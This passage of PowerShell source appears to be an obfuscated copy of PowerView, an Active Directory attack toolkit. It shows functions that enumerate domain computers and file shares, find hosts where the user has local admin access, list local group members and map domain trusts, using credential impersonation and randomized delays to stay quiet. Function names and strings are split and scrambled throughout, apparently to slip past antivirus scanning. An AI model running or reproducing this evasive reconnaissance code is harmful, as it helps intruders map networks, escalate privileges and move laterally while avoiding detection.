                                        $Null =   [IO.Directory]::GeTfILes(  $Path  )
                                        $SearchShares += $Path
                                    }
                                    catch {
                                        Write-Verbose ( '[' +  '!] ' +  'N' +'o ' +'acce'  +'ss' +  ' ' +  't'  + 'o '  +  "$Path" )
                                    }
                                }
                            }
                        }
                    }
                }

                ForEach ( $Share in $SearchShares ) {
                    Write-Verbose (  'S'+  'earc'+'h' + 'ing ' +'s' +'ha' + 're: '+"$Share"  )
                    $SearchArgs =   @{
                        (  "{0}{1}"-f'Pa','th')   =   $Share
                        (  "{0}{1}" -f 'I','nclude' ) =   $Include
                    }
                    if (  $OfficeDocs) {
                        $SearchArgs[(  "{3}{0}{2}{1}"-f 'i','s','ceDoc','Off' )] =  $OfficeDocs
                    }
                    if (  $FreshEXEs ) {
                        $SearchArgs[(  "{1}{0}"-f 'hEXEs','Fres')] =  $FreshEXEs
                    }
                    if ( $LastAccessTime  ) {
                        $SearchArgs[( "{0}{2}{3}{1}"-f'LastAcc','me','essT','i' )]   =  $LastAccessTime
                    }
                    if (  $LastWriteTime) {
                        $SearchArgs[("{1}{2}{0}"-f 'eTime','L','astWrit'  )]   =   $LastWriteTime
                    }
                    if ($CreationTime  ) {
                        $SearchArgs[(  "{1}{2}{3}{0}"-f'ime','C','reati','onT')]   = $CreationTime
                    }
                    if (  $CheckWriteAccess) {
                        $SearchArgs[("{1}{3}{0}{2}"-f'eckWriteAcc','C','ess','h'  )]   =  $CheckWriteAccess
                    }
                    Find-InterestingFile @SearchArgs
                }
            }

            if ( $TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken =   $Null
        if (  $PSBoundParameters[(  "{0}{1}{2}"-f'Cr','edenti','al'  )]) {
            if ( $PSBoundParameters[( "{1}{0}"-f'lay','De')] -or $PSBoundParameters[("{0}{2}{1}{3}" -f 'St','n','opO','Success')]  ) {
                $LogonToken  = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken =  Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if (  $PSBoundParameters[( "{0}{1}" -f'De','lay' )] -or $PSBoundParameters[( "{1}{0}{2}" -f'es','StopOnSucc','s' )] ) {

            Write-Verbose "[Find-InterestingDomainShareFile] Total number of hosts: $($TargetComputers.count) "
            Write-Verbose ('[Fi' + 'n'  + 'd-InterestingDoma'  +'inSh'+'a'  +'reFile] '+  'Delay:'+  ' '  + "$Delay, "+ 'Jitt'  + 'e'+'r: ' +"$Jitter" )
            $Counter =   0
            $RandNo   =  New-Object ( 'Syst'  +'e' +'m.'+'Rand'  +'om')

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter  = $Counter +  1

                
                Start-Sleep -Seconds $RandNo.NeXT( (  1-$Jitter )*$Delay, (  1  +  $Jitter )*$Delay )

                Write-Verbose "[Find-InterestingDomainShareFile] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $Include, $ExcludedShares, $OfficeDocs, $ExcludeHidden, $FreshEXEs, $CheckWriteAccess, $LogonToken
            }
        }
        else {
            Write-Verbose ('[' +  'Find-'  +  'Interestin'+ 'g'+ 'D'+ 'om'+  'ainSh'  +'are'+'Fi' + 'le] '+ 'Usin' + 'g '+ 'thr'+  'ead'  +'ing'+ ' ' +'with' +  ' '+  'th' +'r'+ 'ead'+ 's: '  + "$Threads" )

            
            $ScriptParams =  @{
                ( "{2}{0}{1}" -f 'n','clude','I'  ) =  $Include
                (  "{1}{0}{2}{3}" -f 'luded','Exc','Shar','es') =  $ExcludedShares
                (  "{1}{2}{0}"-f'Docs','Off','ice')   = $OfficeDocs
                ("{1}{0}{3}{2}" -f'eHidd','Exclud','n','e'  )  =  $ExcludeHidden
                ( "{2}{1}{0}"-f 'hEXEs','res','F' )  =  $FreshEXEs
                ("{1}{3}{2}{4}{0}"-f 's','CheckW','A','rite','cces' )   = $CheckWriteAccess
                (  "{1}{0}{3}{2}" -f 'kenHa','To','e','ndl')  =   $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if (  $LogonToken  ) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function finD-locaLa`d`mINAc`C`eSs {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{0}{3}{2}"-f 'r','PSShouldP','s','oces'}, ''  )]
    [OutputType( [String]  )]
    Param(
        [Parameter( POSItIOn   = 0, vALUEFrompipEliNE =  $True, ValuefrompIPElINEByproperTYNaME = $True)]
        [Alias( {"{0}{1}{2}" -f'DNSH','ost','Name'} )]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty( )]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty( )]
        [Alias( {"{1}{3}{0}{2}"-f's','Operati','tem','ngSy'} )]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{0}{2}{1}"-f 'Se','vicePack','r'})]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty()]
        [Alias( {"{2}{0}{1}" -f 'teNa','me','Si'} )]
        [String]
        $ComputerSiteName,

        [Switch]
        $CheckShareAccess,

        [ValidateNotNullOrEmpty( )]
        [Alias(  {"{4}{0}{3}{1}{2}" -f'a','nControll','er','i','Dom'})]
        [String]
        $Server,

        [ValidateSet(  {"{0}{1}"-f 'Bas','e'}, {"{1}{0}{2}" -f'v','OneLe','el'}, {"{0}{1}" -f'Subt','ree'}  )]
        [String]
        $SearchScope =  ("{1}{0}"-f 'ree','Subt'),

        [ValidateRange(1, 10000  )]
        [Int]
        $ResultPageSize  = 200,

        [ValidateRange( 1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(   )]
        $Credential   =   [Management.Automation.PSCredential]::EmPty,

        [ValidateRange( 1, 10000)]
        [Int]
        $Delay =  0,

        [ValidateRange(  0.0, 1.0  )]
        [Double]
        $Jitter  =  .3,

        [Int]
        [ValidateRange(1, 100  )]
        $Threads   =  20
    )

    BEGIN {
        $ComputerSearcherArguments  =  @{
            (  "{2}{0}{1}"-f 'rti','es','Prope' ) =   ( "{0}{1}{2}{3}"-f'd','nsh','ostnam','e'  )
        }
        if ( $PSBoundParameters[("{3}{2}{0}{1}" -f 'rDom','ain','e','Comput' )] ) { $ComputerSearcherArguments[(  "{1}{0}"-f'in','Doma' )]  =   $ComputerDomain }
        if ( $PSBoundParameters[("{2}{3}{4}{5}{0}{1}"-f 'ilt','er','Comp','u','te','rLDAPF' )] ) { $ComputerSearcherArguments[(  "{0}{1}{2}{3}"-f 'LDA','PF','i','lter'  )]   = $ComputerLDAPFilter }
        if ($PSBoundParameters[(  "{5}{0}{2}{4}{3}{1}" -f'er','Base','Sea','ch','r','Comput'  )] ) { $ComputerSearcherArguments[(  "{0}{2}{1}"-f'SearchB','e','as' )]  = $ComputerSearchBase }
        if (  $PSBoundParameters[("{3}{1}{2}{0}"-f 'ed','st','rain','Uncon' )] ) { $ComputerSearcherArguments[( "{2}{0}{3}{1}"-f'nc','ned','U','onstrai'  )]  =  $Unconstrained }
        if ( $PSBoundParameters[("{2}{0}{4}{3}{5}{1}" -f'mputerO','em','Co','r','pe','atingSyst' )]) { $ComputerSearcherArguments[("{2}{0}{3}{1}" -f'perat','m','O','ingSyste'  )]   = $OperatingSystem }
        if (  $PSBoundParameters[( "{3}{0}{4}{2}{5}{1}" -f 'pu','ePack','rSe','Com','te','rvic'  )] ) { $ComputerSearcherArguments[(  "{1}{0}{2}" -f'viceP','Ser','ack'  )]  =  $ServicePack }
        if ($PSBoundParameters[(  "{3}{0}{4}{1}{2}"-f'e','m','e','Comput','rSiteNa' )]  ) { $ComputerSearcherArguments[("{1}{0}{2}" -f 'e','Sit','Name')] = $SiteName }
        if ($PSBoundParameters[( "{0}{1}"-f'S','erver' )] ) { $ComputerSearcherArguments[(  "{1}{0}"-f'er','Serv' )]  =  $Server }
        if ($PSBoundParameters[("{2}{3}{1}{0}" -f 'pe','co','Sea','rchS')]) { $ComputerSearcherArguments[( "{1}{2}{0}"-f 'rchScope','Se','a')]   =  $SearchScope }
        if ( $PSBoundParameters[("{1}{2}{0}" -f'PageSize','Resul','t')] ) { $ComputerSearcherArguments[(  "{1}{2}{0}"-f'e','Resul','tPageSiz')]  =  $ResultPageSize }
        if ($PSBoundParameters[("{0}{1}{2}" -f 'Server','Time','Limit' )]  ) { $ComputerSearcherArguments[( "{0}{1}{2}"-f'Se','rverTimeLi','mit' )] =  $ServerTimeLimit }
        if ( $PSBoundParameters[( "{1}{0}{2}" -f'mbston','To','e')]) { $ComputerSearcherArguments[( "{2}{1}{0}" -f 'stone','b','Tom'  )]  =  $Tombstone }
        if ($PSBoundParameters[(  "{1}{2}{0}"-f 'l','Credent','ia')]) { $ComputerSearcherArguments[(  "{2}{1}{0}"-f 'l','edentia','Cr')]  =   $Credential }

        if ( $PSBoundParameters[( "{2}{1}{0}" -f'terName','ompu','C'  )]) {
            $TargetComputers   =  $ComputerName
        }
        else {
            Write-Verbose (  "{4}{10}{9}{14}{8}{7}{5}{1}{0}{3}{12}{11}{6}{13}{2}{15}"-f'Qu','s] ',' ','eryin','[','s',' i','dminAcce','lA','nd-Lo','Fi','mputers','g co','n the','ca','domain'  )
            $TargetComputers   =   Get-DomainComputer @ComputerSearcherArguments  |  Select-Object -ExpandProperty ('dn'  +  'shostna'+  'm' +'e'  )
        }
        Write-Verbose "[Find-LocalAdminAccess] TargetComputers length: $($TargetComputers.Length) "
        if ($TargetComputers.leNgTh -eq 0  ) {
            throw ("{7}{9}{4}{3}{1}{8}{0}{5}{2}{11}{10}{6}"-f'Acc','alAdm','n','oc','ind-L','ess] No hosts fou',' enumerate','[','in','F','o','d t' )
        }

        
        $HostEnumBlock = {
            Param( $ComputerName, $TokenHandle )

            if (  $TokenHandle) {
                
                $Null   = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName  ) {
                $Up   =   Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ( $Up ) {
                    
                    $Access   = Test-AdminAccess -ComputerName $TargetComputer
                    if ( $Access.isaDmiN  ) {
                        $TargetComputer
                    }
                }
            }

            if (  $TokenHandle ) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken  = $Null
        if ( $PSBoundParameters[("{3}{2}{0}{1}" -f'entia','l','ed','Cr' )] ) {
            if ( $PSBoundParameters[(  "{1}{0}" -f 'y','Dela' )] -or $PSBoundParameters[("{0}{2}{3}{1}"-f 'Stop','s','OnSu','cces')]  ) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken   =   Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if (  $PSBoundParameters[( "{0}{1}" -f 'Dela','y')] -or $PSBoundParameters[("{2}{0}{1}"-f'opOnSucc','ess','St'  )]  ) {

            Write-Verbose "[Find-LocalAdminAccess] Total number of hosts: $($TargetComputers.count) "
            Write-Verbose ('[Fin' +  'd-' +  'LocalA'  + 'dmi' +'nAccess]' +  ' ' + 'Del'  + 'ay: ' +  "$Delay, "+  'Jitt'  +'er: ' + "$Jitter"  )
            $Counter   = 0
            $RandNo  =   New-Object (  'System.R'  +'ando'  + 'm')

            ForEach (  $TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                
                Start-Sleep -Seconds $RandNo.NexT( ( 1-$Jitter )*$Delay, ( 1+ $Jitter )*$Delay)

                Write-Verbose "[Find-LocalAdminAccess] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $LogonToken
            }
        }
        else {
            Write-Verbose ( '['  + 'F'  +  'ind-' + 'Loca'+'lAd'  +  'minAccess] '  + 'Using' +' ' + 'th'+ 're'  +'ading '  +'w'  +  'ith '  +'t'  +  'h'+'reads'+ ': '  + "$Threads" )

            
            $ScriptParams  =   @{
                (  "{0}{3}{2}{1}"-f 'To','e','l','kenHand' )  = $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }
}


function find`-DO`mAInlOc`AlGrO`UpM`embeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{4}{2}{0}{3}"-f 'ce','PS','o','ss','ShouldPr'}, '')]
    [OutputType(  {"{3}{2}{6}{8}{4}{1}{7}{0}{5}" -f'mber','Gro','we','Po','l','.API','rView.Lo','upMe','ca'})]
    [OutputType({"{2}{1}{3}{5}{0}{4}" -f 'WinN','rVi','Powe','ew.LocalGrou','T','pMember.'} )]
    Param( 
        [Parameter(  POSItIOn  = 0, VAluefROmpIPeliNe  = $True, vALueFROMpIPELineBYpRoPERTYNamE =  $True  )]
        [Alias(  {"{2}{0}{1}"-f'SHostNa','me','DN'})]
        [String[]]
        $ComputerName,

        [ValidateNotNullOrEmpty(  )]
        [String]
        $ComputerDomain,

        [ValidateNotNullOrEmpty( )]
        [String]
        $ComputerLDAPFilter,

        [ValidateNotNullOrEmpty(   )]
        [String]
        $ComputerSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}{3}" -f 'ingSyste','perat','O','m'})]
        [String]
        $ComputerOperatingSystem,

        [ValidateNotNullOrEmpty(   )]
        [Alias({"{0}{2}{1}"-f'Se','cePack','rvi'}  )]
        [String]
        $ComputerServicePack,

        [ValidateNotNullOrEmpty(  )]
        [Alias(  {"{1}{2}{0}" -f 'me','Si','teNa'}  )]
        [String]
        $ComputerSiteName,

        [Parameter(ValuefROMPipELineByprOpERTYNAmE   =   $True )]
        [ValidateNotNullOrEmpty(   )]
        [String]
        $GroupName   = ("{3}{1}{0}{4}{2}"-f 'at','istr','rs','Admin','o' ),

        [ValidateSet(  'API', {"{1}{0}" -f'inNT','W'} )]
        [Alias(  {"{3}{0}{1}{2}" -f'ollec','tionMeth','od','C'} )]
        [String]
        $Method = 'API',

        [ValidateNotNullOrEmpty(   )]
        [Alias(  {"{3}{0}{1}{2}{4}"-f'Contro','l','le','Domain','r'} )]
        [String]
        $Server,

        [ValidateSet(  {"{0}{1}"-f'Bas','e'}, {"{2}{0}{1}"-f'Lev','el','One'}, {"{0}{1}"-f 'Sub','tree'})]
        [String]
        $SearchScope =  ( "{0}{2}{1}"-f 'S','btree','u' ),

        [ValidateRange( 1, 10000  )]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(  1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential  = [Management.Automation.PSCredential]::eMPtY,

        [ValidateRange(1, 10000  )]
        [Int]
        $Delay =   0,

        [ValidateRange(  0.0, 1.0)]
        [Double]
        $Jitter   =  .3,

        [Int]
        [ValidateRange(1, 100 )]
        $Threads   =  20
      )

    BEGIN {
        $ComputerSearcherArguments  = @{
            ("{0}{1}{2}"-f 'P','rop','erties' )  =   ( "{3}{2}{0}{1}" -f'ostnam','e','h','dns'  )
        }
        if ($PSBoundParameters[(  "{1}{2}{0}"-f 'uterDomain','Co','mp'  )]) { $ComputerSearcherArguments[(  "{1}{2}{0}" -f'in','D','oma')]  =  $ComputerDomain }
        if ( $PSBoundParameters[("{3}{4}{2}{0}{1}"-f 'l','ter','PFi','Compute','rLDA' )]) { $ComputerSearcherArguments[("{2}{1}{0}"-f'r','Filte','LDAP')] =  $ComputerLDAPFilter }
        if ($PSBoundParameters[(  "{0}{3}{4}{2}{5}{1}"-f 'Comput','e','Ba','e','rSearch','s'  )] ) { $ComputerSearcherArguments[( "{2}{0}{1}" -f'chBas','e','Sear' )]   = $ComputerSearchBase }
        if ( $PSBoundParameters[( "{2}{0}{3}{1}"-f 'onst','ed','Unc','rain' )]  ) { $ComputerSearcherArguments[(  "{0}{3}{1}{2}" -f 'U','n','strained','nco')]   = $Unconstrained }
        if ($PSBoundParameters[( "{3}{4}{2}{1}{0}"-f'tem','peratingSys','erO','Comp','ut'  )]) { $ComputerSearcherArguments[(  "{0}{1}{3}{2}"-f'OperatingS','y','em','st')]  =  $OperatingSystem }
        if (  $PSBoundParameters[(  "{5}{1}{0}{4}{2}{3}"-f'puterSer','m','ac','k','viceP','Co'  )]  ) { $ComputerSearcherArguments[(  "{1}{0}{2}"-f 'r','Se','vicePack' )] =   $ServicePack }
        if ( $PSBoundParameters[("{0}{2}{1}{3}"-f'Comp','SiteNam','uter','e' )] ) { $ComputerSearcherArguments[("{0}{1}{2}" -f 'Site','Nam','e')] =  $SiteName }
        if ($PSBoundParameters[("{1}{0}" -f 'rver','Se')]  ) { $ComputerSearcherArguments[("{0}{1}" -f'S','erver')] =   $Server }
        if ( $PSBoundParameters[("{1}{2}{0}" -f 'cope','Search','S'  )] ) { $ComputerSearcherArguments[(  "{2}{3}{1}{0}" -f'pe','co','Se','archS'  )]  =  $SearchScope }
        if ( $PSBoundParameters[(  "{2}{0}{3}{1}"-f 'ultPageS','ze','Res','i')] ) { $ComputerSearcherArguments[(  "{3}{2}{0}{1}{4}"-f 'Pag','eS','sult','Re','ize'  )]   =  $ResultPageSize }
        if (  $PSBoundParameters[("{1}{0}{2}"-f'i','ServerTimeLim','t' )]) { $ComputerSearcherArguments[("{0}{1}{2}{3}"-f 'Serve','rTi','me','Limit')] = $ServerTimeLimit }
        if (  $PSBoundParameters[("{2}{1}{0}" -f'tone','s','Tomb' )] ) { $ComputerSearcherArguments[("{3}{1}{0}{2}" -f 'to','mbs','ne','To'  )]  =  $Tombstone }
        if (  $PSBoundParameters[(  "{2}{0}{1}" -f'r','edential','C' )] ) { $ComputerSearcherArguments[( "{2}{0}{1}"-f 'ent','ial','Cred')] =  $Credential }

        if ($PSBoundParameters[(  "{1}{3}{2}{0}" -f 'e','C','puterNam','om' )]  ) {
            $TargetComputers   =  $ComputerName
        }
        else {
            Write-Verbose ("{3}{12}{8}{13}{6}{5}{14}{10}{1}{0}{9}{2}{11}{4}{7}"-f'om','] Querying c','uters i','[Find','he dom','ro','ocalG','ain','Do','p','ember','n t','-','mainL','upM' )
            $TargetComputers  =   Get-DomainComputer @ComputerSearcherArguments |   Select-Object -ExpandProperty ('d'  +  'nshost' +'name')
        }
        Write-Verbose "[Find-DomainLocalGroupMember] TargetComputers length: $($TargetComputers.Length) "
        if ($TargetComputers.LEnGth -eq 0) {
            throw (  "{9}{11}{7}{6}{12}{14}{0}{8}{1}{4}{13}{3}{2}{5}{15}{10}"-f ' N','f','n','to e','ou','u','alG','nLoc','o hosts ','[Find-Doma','e','i','roupMemb','nd ','er]','merat')
        }

        
        $HostEnumBlock =  {
            Param($ComputerName, $GroupName, $Method, $TokenHandle)

            
            if (  $GroupName -eq ("{2}{1}{3}{0}{4}" -f'r','min','Ad','ist','ators')) {
                $AdminSecurityIdentifier  =   New-Object ( 'Syste' +  'm' + '.Security.' +  'Principal.Secu'+'rityI' +  'd' +  'enti'+'fier' )( [System.Security.Principal.WellKnownSidType]::BuiLTInaDmInIStrATOrSSiD,$null  )
                $GroupName   =   (  $AdminSecurityIdentifier.tRANsLatE( [System.Security.Principal.NTAccount]  ).VAlue -split "\\" )[-1]
            }

            if (  $TokenHandle) {
                
                $Null  =  Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach (  $TargetComputer in $ComputerName) {
                $Up =  Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ( $Up) {
                    $NetLocalGroupMemberArguments   =  @{
                        ("{0}{2}{1}" -f 'Comput','Name','er' )  =   $TargetComputer
                        (  "{1}{0}" -f'ethod','M' ) = $Method
                        ( "{1}{0}{2}{3}" -f 'u','Gro','pN','ame'  ) =   $GroupName
                    }
                    Get-NetLocalGroupMember @NetLocalGroupMemberArguments
                }
            }

            if ( $TokenHandle  ) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken  =  $Null
        if ($PSBoundParameters[("{2}{0}{1}" -f'e','dential','Cr')]) {
            if (  $PSBoundParameters[( "{0}{1}"-f 'Dela','y')] -or $PSBoundParameters[("{2}{1}{0}{3}" -f'ucces','topOnS','S','s')]) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken  =   Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        
        if (  $PSBoundParameters[("{1}{0}"-f'elay','D')] -or $PSBoundParameters[(  "{2}{3}{1}{0}"-f 'ess','cc','Sto','pOnSu'  )] ) {

            Write-Verbose "[Find-DomainLocalGroupMember] Total number of hosts: $($TargetComputers.count) "
            Write-Verbose ('[Find-Domain'  +'L'  +'oc' + 'a'+'lG'+  'roupMe'+ 'mbe'+ 'r] '  +  'Del'  +  'ay:'  + ' ' +  "$Delay, "  + 'J' +'i'  +'tter: '+  "$Jitter"  )
            $Counter   =   0
            $RandNo  =  New-Object ('System.Ra'  +  'nd'  +'o'  +'m' )

            ForEach (  $TargetComputer in $TargetComputers) {
                $Counter   =   $Counter   +  1

                
                Start-Sleep -Seconds $RandNo.next(  ( 1-$Jitter )*$Delay, ( 1 +$Jitter  )*$Delay  )

                Write-Verbose "[Find-DomainLocalGroupMember] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count)) "
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $GroupName, $Method, $LogonToken
            }
        }
        else {
            Write-Verbose ('[Fin' +'d-'+'DomainL' +'ocalGroupMemb'  + 'e' +'r] '  + 'Us'+  'ing '+  'thr'  +'ea'  +'ding'+  ' ' +'w'+  'ith ' + 't' +  'hrea' +'ds: ' + "$Threads" )

            
            $ScriptParams  =   @{
                (  "{2}{1}{0}"-f 'ame','oupN','Gr' )   =  $GroupName
                (  "{0}{1}" -f'Me','thod'  )   =  $Method
                ("{2}{1}{0}" -f'e','kenHandl','To' )  =  $LogonToken
            }

            
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ( $LogonToken ) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}








function G`Et-Do`MaINT`RuSt {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute( {"{1}{3}{2}{0}"-f 'ss','PS','dProce','Shoul'}, '' )]
    [OutputType( {"{5}{1}{7}{4}{2}{0}{6}{3}"-f'Tr','ower','n','NET','ew.Domai','P','ust.','Vi'}  )]
    [OutputType( {"{0}{2}{1}{4}{5}{3}"-f 'P','Vie','ower','DAP','w.DomainTrust','.L'} )]
    [OutputType( {"{4}{0}{3}{2}{1}" -f'nT','.API','st','ru','PowerView.Domai'}  )]
    [CmdletBinding(dEFauLtpArAmETerseTnAMe   = {"{1}{0}"-f 'AP','LD'}  )]
    Param(
        [Parameter(  POsItion   =   0, VAlueFROmpIpElINE   =  $True, vALUEfRoMpipELINEbYPROPerTYNAME   = $True)]
        [Alias( {"{1}{0}"-f 'me','Na'}  )]
        [ValidateNotNullOrEmpty(   )]
        [String]
        $Domain,

        [Parameter( PaRAmEterSetNamE   = 'API' )]
        [Switch]
        $API,

        [Parameter(  ParaMEtErSETNAME   = 'NET' )]
        [Switch]
        $NET,

        [Parameter( ParAmeTERsEtNaMe  =  "L`dap" )]
        [ValidateNotNullOrEmpty( )]
        [Alias( {"{0}{1}" -f'Filt','er'})]
        [String]
        $LDAPFilter,

        [Parameter(PArAMEterSETnAMe  =   "ld`AP" )]
        [ValidateNotNullOrEmpty(  )]
        [String[]]
        $Properties,

        [Parameter( ParAMetErsetNAMe =   "l`daP" )]
        [ValidateNotNullOrEmpty(  )]
        [Alias({"{0}{1}" -f 'ADS','Path'})]
        [String]
        $SearchBase,

        [Parameter(  PaRAMEteRsetNAMe   =   "L`DaP"  )]
        [Parameter( pARAmeterSEtNAMe =  'API')]
        [ValidateNotNullOrEmpty(  )]
        [Alias( {"{4}{3}{0}{1}{2}" -f 'nCont','r','oller','i','Doma'}  )]
        [String]
        $Server,

        [Parameter( PARamEtERsetNAMe  =   "l`dAP" )]
        [ValidateSet(  {"{0}{1}"-f'Ba','se'}, {"{2}{0}{1}"-f 'eLeve','l','On'}, {"{1}{0}"-f 'tree','Sub'})]
        [String]
        $SearchScope   =  ( "{1}{0}" -f 'ubtree','S'  ),

        [Parameter( pARametErSeTnAME =   "l`dap"  )]
        [ValidateRange( 1, 10000  )]
        [Int]
        $ResultPageSize  =   200,

        [Parameter( paraMetErSeTnaME  =  "l`DAp"  )]
        [ValidateRange(  1, 10000  )]
        [Int]
        $ServerTimeLimit,

        [Parameter(  PArameTerSetNAMe   =  "Ld`AP")]
        [Switch]
        $Tombstone,

        [Alias(  {"{2}{1}{0}"-f 'nOne','etur','R'})]
        [Switch]
        $FindOne,

        [Parameter(PARameTersEtnamE =   "Ld`Ap" )]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute(  )]
        $Credential   =   [Management.Automation.PSCredential]::eMpTY
     )

    BEGIN {
        $TrustAttributes   =  @{
            [uint32]( "{2}{0}{1}" -f'x0000','0001','0') =   ("{4}{3}{2}{1}{0}"-f 'IVE','T','ANSI','_TR','NON' )
            [uint32]("{3}{0}{2}{1}"-f 'x0','00002','00','0' )   = ( "{2}{0}{1}"-f'ONL','Y','UPLEVEL_' )
            [uint32]( "{1}{0}{2}" -f '0000000','0x','4') =  ("{3}{0}{1}{2}" -f'ILTER','_SID','S','F')
            [uint32](  "{2}{0}{1}" -f '00000','8','0x00')   =   (  "{2}{0}{3}{1}"-f 'R','SITIVE','FOREST_T','AN')
            [uint32]( "{1}{2}{0}"-f'00010','0x00','0' )   =  (  "{2}{0}{5}{1}{3}{4}" -f 'ORG','I','CROSS_','ZAT','ION','AN')
            [uint32](  "{2}{1}{0}"-f'0020','000','0x0' )  =   ( "{1}{2}{0}" -f 'OREST','WI','THIN_F'  )
            [uint32]( "{0}{2}{1}"-f'0x0','000040','0' ) =   (  "{2}{3}{0}{1}" -f 'AS_EXTE','RNAL','TR','EAT_'  )
            [uint32]("{0}{2}{1}{3}"-f'0x00','8','0000','0'  ) = ("{1}{4}{3}{0}{2}"-f'C4_','T','ENCRYPTION','T_USES_R','RUS' )
            [uint32]( "{2}{0}{1}"-f '1','00','0x00000' )  =  ( "{3}{2}{0}{1}" -f'E','S_KEYS','_A','TRUST_USES')
            [uint32]( "{0}{2}{1}" -f'0','0200','x0000') =   ("{3}{9}{6}{8}{5}{7}{4}{1}{0}{2}{10}" -f'ELEGA','_D','T','C','GT','ANIZATI','OSS','ON_NO_T','_ORG','R','ION' )
            [uint32](  "{1}{2}{0}"-f '000400','0x0','0')  = ("{1}{0}" -f'RUST','PIM_T' )
        }

        $LdapSearcherArguments = @{}
        if (  $PSBoundParameters[(  "{1}{0}" -f'in','Doma' )]  ) { $LdapSearcherArguments[("{0}{1}" -f 'Do','main'  )] = $Domain }
        if ($PSBoundParameters[( "{2}{1}{0}" -f 'Filter','DAP','L' )] ) { $LdapSearcherArguments[(  "{1}{0}{2}"-f 'ilte','LDAPF','r' )]  =  $LDAPFilter }
        if ($PSBoundParameters[(  "{0}{2}{1}" -f 'Prop','rties','e')]  ) { $LdapSearcherArguments[("{2}{1}{0}" -f 'erties','p','Pro' )]  =   $Properties }
        if ($PSBoundParameters[("{1}{0}{2}"-f'chB','Sear','ase'  )] ) { $LdapSearcherArguments[("{2}{0}{1}" -f'archBa','se','Se')]   =   $SearchBase }
        if (  $PSBoundParameters[("{0}{1}"-f'Se','rver' )] ) { $LdapSearcherArguments[( "{0}{1}" -f 'S','erver')]   =  $Server }
        if ($PSBoundParameters[( "{0}{1}{2}"-f 'Se','a','rchScope'  )]  ) { $LdapSearcherArguments[( "{2}{1}{0}" -f'e','archScop','Se')] = $SearchScope }
        if ($PSBoundParameters[(  "{0}{2}{3}{4}{1}" -f'Re','geSize','s','ult','Pa'  )] ) { $LdapSearcherArguments[( "{1}{0}{4}{3}{2}"-f'es','R','Size','ltPage','u'  )] =   $ResultPageSize }
        if (  $PSBoundParameters[(  "{1}{2}{0}"-f'Limit','Se','rverTime'  )]  ) { $LdapSearcherArguments[("{0}{2}{1}{3}"-f'Serve','i','rTimeLim','t' )] =   $ServerTimeLimit }
        if (  $PSBoundParameters[("{1}{0}{2}"-f'om','T','bstone'  )]) { $LdapSearcherArguments[(  "{2}{0}{1}" -f'om','bstone','T' )]   =   $Tombstone }
        if (  $PSBoundParameters[("{0}{3}{2}{1}" -f 'C','tial','den','re' )]) { $LdapSearcherArguments[(  "{2}{0}{1}" -f'd','ential','Cre' )]  =  $Credential }
    }

    PROCESS {
        if ( $PsCmdlet.parAMetErSeTnAME -ne 'API') {
            $NetSearcherArguments = @{}
            if (  $Domain -and $Domain.TRim( ) -ne ''  ) {
                $SourceDomain  =  $Domain
            }
            else {
                if ( $PSBoundParameters[( "{0}{1}{2}"-f'C','r','edential')]  ) {
                    $SourceDomain  =   (Get-Domain -Credential $Credential  ).nAmE
                }
                else {
                    $SourceDomain  =   ( Get-Domain  ).namE
                }
            }
        }
        elseif (  $PsCmdlet.PaRAmeTERsETNaMe -ne 'NET') {
            if ( $Domain -and $Domain.TrIm( ) -ne '' ) {
                $SourceDomain   =   $Domain
            }
            else {
                $SourceDomain   =   $Env:USERDNSDOMAIN
